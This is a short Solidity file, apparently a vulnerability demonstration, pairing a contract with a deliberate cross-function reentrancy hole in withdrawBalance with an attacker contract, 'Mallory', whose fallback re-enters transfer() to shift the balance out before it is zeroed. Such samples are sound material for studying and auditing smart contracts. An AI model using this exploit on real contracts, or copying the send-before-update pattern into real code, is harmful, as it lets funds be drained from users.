pragma solidity ^0.4.25;

contract CrossFunctionReentrancy {

    mapping (address => uint) private userBalances;

    function invest() public payable {
        userBalances[msg.sender] += msg.value;
    }

    function transfer(address to, uint amount) public {
        if (userBalances[msg.sender] >= amount) {
           userBalances[to] += amount;
           userBalances[msg.sender] -= amount;
        }
    }

    function withdrawBalance() public {
        uint amountToWithdraw = userBalances[msg.sender];
        require(msg.sender.call.value(amountToWithdraw)()); // At this point, the caller's code is executed, and can call transfer()
        userBalances[msg.sender] = 0;
    }

}

contract Mallory {
  CrossFunctionReentrancy public cfr;
  address owner;
  bool public performAttack = true;

  constructor(CrossFunctionReentrancy addr) public {
    owner = msg.sender;
    cfr = addr;
  }

  function attack() public payable {
    cfr.invest.value(msg.value)();
    cfr.withdrawBalance();
  }

  function getJackpot() public {
    if (owner.send(address(this).balance)) {
        performAttack = true;
    }
  }

  function() public payable {
    if (performAttack) {
       performAttack = false;
       cfr.transfer(owner, msg.value);
    }
  }
}
